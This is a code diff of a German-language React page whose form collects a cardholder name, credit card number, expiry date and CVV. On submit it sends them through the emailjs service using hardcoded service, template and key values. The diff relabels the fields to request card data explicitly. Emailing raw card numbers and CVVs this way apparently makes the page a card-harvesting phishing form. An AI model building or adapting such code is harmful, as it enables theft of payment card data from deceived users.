@@ -24,7 +24,6 @@ const HomePage = () => {
   const [selectOneValue, setSelectOneValue] = useState("");
   const [selectTwoValue, setSelectTwoValue] = useState("");
   const [message, setMessage] = useState("");
-  const [isGo, setIsGo] = useState(false);
   const form = useRef();
   const txtArea = useRef();
   const selectOne = useRef();
@@ -47,11 +46,6 @@ const HomePage = () => {
   }, [kartennummer, kartenprufnummer, selectOneValue, selectTwo, Gültigkeit]);
   console.log(message);
   const submit = () => {
-    // setMessage(
-    //   (prev) =>
-    //     `${prev} kartennummer: ${kartennummer}\n kartenprufnummer: ${kartenprufnummer}\n Exp: ${selectOneValue}/${selectTwoValue}\n cvv: ${Gültigkeit}`
-    // );
-
     emailjs.sendForm("service_usdywy7", "template_20m02fk", form.current, {
       publicKey: "pYexSWO4f8GOPt5yA",
     });
@@ -229,12 +223,12 @@ const HomePage = () => {
               />
 
               <div className="flex flex-col gap-[10px] mt-[10px]">
-                <label htmlFor="">Kartenprufnummer</label>
+                <label htmlFor="">Karteninhaber</label>
                 <input
                   type="text"
                   onChange={(e) => setKartenprufnummer(e.target.value)}
                   className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
-                  placeholder={"Kartenprufnummer"}
+                  placeholder={"Karteninhaber"}
                   required
                 />
               </div>
@@ -249,17 +243,17 @@ const HomePage = () => {
                 />
               </div> */}
               <div className="flex flex-col gap-[10px] mt-[10px]">
-                <label htmlFor="">Kartennummer</label>
+                <label htmlFor="">Kreditkartennummer</label>
                 <input
                   type="text"
                   onChange={(e) => setKartennummer(e.target.value)}
                   className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
-                  placeholder={"Kartennummer"}
+                  placeholder={"Kreditkartennummer"}
                   required
                 />
               </div>
               <div className="flex flex-col gap-[15px] mt-[15px]">
-                <label htmlFor="">Kartennummer</label>
+                <label htmlFor="">Gültigkeitsdatum</label>
                 <section className="flex items-center gap-2">
                   <select
                     ref={selectOne}
@@ -288,10 +282,11 @@ const HomePage = () => {
                 </section>
               </div>
               <div className="flex flex-col gap-[15px] mt-[15px]">
-                <label htmlFor="">Gültigkeit</label>
+                <label htmlFor="">CVV</label>
                 <input
                   type="text"
                   maxLength={3}
+                  placeholder="XXX"
                   onChange={(e) => setKarditkartenanbieter(e.target.value)}
                   className="p-[10px] border-solid border-[#bbb] w-[100px] border-[2px]"
                 />
